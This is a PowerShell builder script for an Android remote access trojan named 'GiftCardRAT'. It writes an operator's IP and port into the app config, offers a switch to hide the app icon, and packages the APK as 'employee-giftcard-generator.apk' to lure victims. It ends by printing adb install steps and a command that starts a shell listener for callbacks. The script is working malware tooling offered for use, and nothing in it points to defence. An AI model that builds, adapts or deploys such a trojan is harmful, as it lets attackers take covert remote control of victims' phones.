#!/usr/bin/env pwsh
# GiftCardRAT APK Builder
# Automates the Gradle build process

param(
    [Parameter(Mandatory=$true)]
    [string]$IP,
    
    [Parameter(Mandatory=$true)]
    [string]$Port,
    
    [switch]$HideIcon,
    
    [string]$OutputName = "employee-giftcard-generator.apk"
)

Write-Host "`n===================================" -ForegroundColor Cyan
Write-Host "  GiftCardRAT APK Builder" -ForegroundColor Yellow
Write-Host "===================================" -ForegroundColor Cyan

# Validate IP
if ($IP -notmatch '^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$') {
    Write-Host "[ERROR] Invalid IP address format" -ForegroundColor Red
    exit 1
}

# Validate Port
if ($Port -notmatch '^\d+$' -or [int]$Port -lt 1 -or [int]$Port -gt 65535) {
    Write-Host "[ERROR] Invalid port number (must be 1-65535)" -ForegroundColor Red
    exit 1
}

$configFile = "Android\app\src\main\java\com\employee\giftcard\config.java"

Write-Host "`n[INFO] Configuration:" -ForegroundColor Green
Write-Host "  Server IP:    $IP" -ForegroundColor White
Write-Host "  Server Port:  $Port" -ForegroundColor White
Write-Host "  Icon Visible: $(-not $HideIcon)" -ForegroundColor White
Write-Host "  Output Name:  $OutputName" -ForegroundColor White

# Update config.java
Write-Host "`n[INFO] Updating configuration file..." -ForegroundColor Green

$iconValue = if ($HideIcon) { "true" } else { "false" }

$configContent = @"
package com.employee.giftcard;

public class config {
    public static String IP = "$IP";
    public static String port = "$Port";
    public static boolean icon = $iconValue;
}
"@

Set-Content -Path $configFile -Value $configContent -Encoding UTF8
Write-Host "[SUCCESS] Configuration updated" -ForegroundColor Green

# Clean previous builds
Write-Host "`n[INFO] Cleaning previous builds..." -ForegroundColor Green
Push-Location Android
& .\gradlew clean | Out-Null
Pop-Location
Write-Host "[SUCCESS] Clean complete" -ForegroundColor Green

# Build APK
Write-Host "`n[INFO] Building APK..." -ForegroundColor Green
Push-Location Android
& .\gradlew assembleDebug
$buildResult = $LASTEXITCODE
Pop-Location

if ($buildResult -ne 0) {
    Write-Host "`n[ERROR] Build failed!" -ForegroundColor Red
    exit 1
}

# Copy and rename APK
$sourceApk = "Android\app\build\outputs\apk\debug\app-debug.apk"
$destApk = $OutputName

if (Test-Path $sourceApk) {
    Copy-Item $sourceApk $destApk -Force
    $apkSize = (Get-Item $destApk).Length / 1MB
    
    Write-Host "`n===================================" -ForegroundColor Cyan
    Write-Host "[SUCCESS] APK built successfully!" -ForegroundColor Green
    Write-Host "===================================" -ForegroundColor Cyan
    Write-Host "`nLocation: $(Resolve-Path $destApk)" -ForegroundColor White
    Write-Host "Size:     $([math]::Round($apkSize, 2)) MB" -ForegroundColor White
    
    Write-Host "`n[INFO] To install on device:" -ForegroundColor Yellow
    Write-Host '  $env:Path += ";C:\platform-tools"' -ForegroundColor White
    Write-Host "  adb install `"$destApk`"" -ForegroundColor White
    
    Write-Host "`n[INFO] To start listener:" -ForegroundColor Yellow
    Write-Host "  python giftcard-rat.py --shell -i 0.0.0.0 -p $Port" -ForegroundColor White
} else {
    Write-Host "`n[ERROR] APK not found at expected location" -ForegroundColor Red
    exit 1
}
